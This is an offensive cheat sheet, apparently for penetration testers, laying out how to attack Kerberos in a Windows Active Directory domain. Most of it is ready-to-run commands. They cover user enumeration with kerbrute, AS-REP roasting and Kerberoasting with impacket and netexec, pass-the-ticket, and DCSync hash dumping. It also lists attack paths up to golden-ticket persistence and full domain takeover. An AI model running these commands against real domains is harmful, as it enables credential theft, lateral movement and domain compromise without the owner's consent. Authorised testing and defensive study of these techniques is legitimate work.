# Kerberos Battle Card

## What to Check First
```
1. PORT 88 OPEN? → nmap -sV -p 88 target (KDC detection)
2. USER ENUM → kerbrute userenum -d domain.local --dc target users.txt
3. AS-REP ROAST → GetNPUsers.py domain.local/ -dc-ip target -request
4. KERBEROAST → GetUserSPNs.py domain.local/user:pass -dc-ip target -request
```

## High-Value Findings
- **AS-REP roastable user** → No pre-auth = crackable TGT
- **Kerberoastable SPN** → Crack service hash = service account creds
- **Kerbrute user enumeration** → Valid users without any creds
- **Golden ticket path** → KRBTGT hash obtained = DA forever
- **Silver ticket path** → Service NTLM hash = service impersonation
- **DCSync path** → DA rights → DCSync → All hashes
- **Constrained delegation abuse** → Protocol transition → DA

## Immediate Commands
```
# User enumeration (no creds)
kerbrute userenum -d domain.local --dc target users.txt -o valid_users.txt

# AS-REP roasting (no creds needed for some users)
impacket-GetNPUsers domain.local/ -dc-ip target -usersfile valid_users.txt -request -format hashcat

# Kerberoasting (needs creds)
impacket-GetUserSPNs domain.local/user:pass -dc-ip target -request -format hashcat

# With netexec
netexec ldap target -u user -p pass --asreproast asrep.txt
netexec ldap target -u user -p pass --kerberoast krb.txt

# Validate creds with Kerberos
netexec smb target -u user -p pass -k
netexec winrm target -u user -p pass -k

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k domain.local/user@target

# DCSync (if DA rights)
impacket-secretsdump -just-dc domain.local/user:pass@target
```

## Common Attack Paths
```
NO CREDS → Kerbrute → Valid Users → AS-REP Roast → Crack → Access
DOMAIN USER → Kerberoast → Crack → Service Account → Lateral
DOMAIN USER → RC4 Encryption → Crack → Service Account
DA → DCSync → All Hashes → Full Domain Compromise
KRBTGT HASH → Golden Ticket → Any Domain Access
SERVICE HASH → Silver Ticket → Service Impersonation
```

## Escalation Paths
- **Valid user list** → Password spray targets
- **Cracked TGT (AS-REP)** → Domain user shell
- **Cracked service hash** → Service account → Often high-privilege
- **DCSync** → Complete domain takeover
- **KRBTGT hash** → Domain persistence (golden ticket)

## When to Stop
- Kerbrute finds no users, AS-REP returns nothing, no creds for Kerberoast
- Move to SMB/LDAP anonymous enumeration first

## Common Mistakes
- Forgetting to run Kerbrute before trying other enum methods
- Using wrong format for hashcat (need `--format hashcat` or `john`)
- Not checking AS-REP roast on ALL discovered users
- Kerberoasting only when you already have creds (can sometimes be done via other means)
- Not saving .ccache tickets properly for Pass-the-Ticket
- Forgetting RC4 encryption downgrade for Kerberoast
